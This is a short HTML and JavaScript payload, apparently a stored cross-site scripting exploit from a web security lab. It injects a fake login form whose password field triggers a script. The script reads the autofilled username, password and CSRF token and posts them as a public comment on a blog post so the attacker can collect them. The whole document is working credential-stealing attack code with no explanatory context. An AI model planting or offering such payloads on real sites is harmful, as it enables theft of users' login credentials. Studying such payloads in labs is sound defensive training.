<script>function make_post(){let xhttp = new XMLHttpRequest();
	xhttp.open("POST", "/post/comment", true);
	let csrf_token = document.getElementsByName('csrf')[1].value;
	let username = document.getElementsByName('username')[0].value;
	let password = document.getElementsByName('password')[0].value;
	let payload = "csrf="+csrf_token+"&postId=4&comment="+username+":"+csrf_token+":"+password+"&name=tester&email=tester@test.com&website=";
	xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	xhttp.send(payload);}</script><form class="login-form" action="/login" method="POST">
    <input required="" type="hidden" name="csrf" value="ivZuTa685A4ISkXuHuPWQljrmuphtUiZ">
    <label>Username</label>
    <input required="" type="username" name="username">
    <label>Password</label>
    <input required="" type="password" name="password" onchange="make_post()">
    <button class="button" type="submit"> Log in </button>
</form>